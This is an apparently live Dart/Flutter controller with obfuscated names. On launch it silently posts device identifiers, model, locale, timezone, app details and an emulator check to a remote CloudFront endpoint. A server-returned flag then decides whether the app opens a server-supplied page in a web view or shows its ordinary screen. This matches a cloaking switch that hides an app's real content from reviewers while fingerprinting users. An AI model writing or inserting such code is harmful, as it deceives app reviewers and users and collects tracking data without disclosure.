import 'dart:io';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';
import 'package:dio/dio.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ReverseEntranceLogic extends GetxController {

  var ychfzkotdv = RxBool(false);
  var bzvydnt = RxBool(true);
  var chyru = RxString("");
  var rodrick = RxBool(false);
  var anderson = RxBool(true);
  final kyqbxev = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zorav();
  }


  Future<void> zorav() async {
    rodrick.value = true;
    anderson.value = true;
    bzvydnt.value = false;

    kyqbxev.post("https://d1uifthkzpga2b.cloudfront.net/iwsnprfohqkxcuzabmydvglejt",data: await dzhqmln()).then((value) {
      var ldonyze = value.data["ldonyze"] as String;
      var qygfdoeb = value.data["qygfdoeb"] as bool;
      if (qygfdoeb) {
        chyru.value = ldonyze;
        ruthe();
      } else {
        jakubowski();
      }
    }).catchError((e) {
      bzvydnt.value = true;
      anderson.value = true;
      rodrick.value = false;
    });
  }

  Future<Map<String, dynamic>> dzhqmln() async {
    final DeviceInfoPlugin uchyfxmi = DeviceInfoPlugin();
    PackageInfo zhluodec_tybpu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uinjx = Platform.localeName;
    var pay_fUpM = currentTimeZone;

    var pay_aSQewohp = zhluodec_tybpu.packageName;
    var pay_kYo = zhluodec_tybpu.version;
    var pay_yYKPrQBx = zhluodec_tybpu.buildNumber;

    var pay_wedxIblu = zhluodec_tybpu.appName;
    var pay_hH = "";
    var pay_cEUY  = "";
    var pay_zfxgr = "";
    var josueKautzer = "";
    var ferneChamplin = "";
    var montanaHarvey = "";
    var connerMoore = "";


    var pay_FJBYm = "";
    var pay_dlkTNCgJ = false;

    if (GetPlatform.isAndroid) {
      pay_FJBYm = "android";
      var sntmckywbd = await uchyfxmi.androidInfo;

      pay_zfxgr = sntmckywbd.brand;

      pay_hH  = sntmckywbd.model;
      pay_cEUY = sntmckywbd.id;

      pay_dlkTNCgJ = sntmckywbd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pay_FJBYm = "ios";
      var ruzcaqh = await uchyfxmi.iosInfo;
      pay_zfxgr = ruzcaqh.name;
      pay_hH = ruzcaqh.model;

      pay_cEUY = ruzcaqh.identifierForVendor ?? "";
      pay_dlkTNCgJ  = ruzcaqh.isPhysicalDevice;
    }
    var res = {
      "pay_wedxIblu": pay_wedxIblu,
      "pay_kYo": pay_kYo,
      "pay_aSQewohp": pay_aSQewohp,
      "pay_hH": pay_hH,
      "montanaHarvey" : montanaHarvey,
      "pay_fUpM": pay_fUpM,
      "pay_zfxgr": pay_zfxgr,
      "ferneChamplin" : ferneChamplin,
      "pay_cEUY": pay_cEUY,
      "uinjx": uinjx,
      "pay_FJBYm": pay_FJBYm,
      "pay_yYKPrQBx": pay_yYKPrQBx,
      "pay_dlkTNCgJ": pay_dlkTNCgJ,
      "josueKautzer" : josueKautzer,
      "connerMoore" : connerMoore,

    };
    return res;
  }

  Future<void> jakubowski() async {
    Get.offNamed("/reverseTab");
  }

  Future<void> ruthe() async {
    Get.offNamed("/videoPlayer");
  }

}
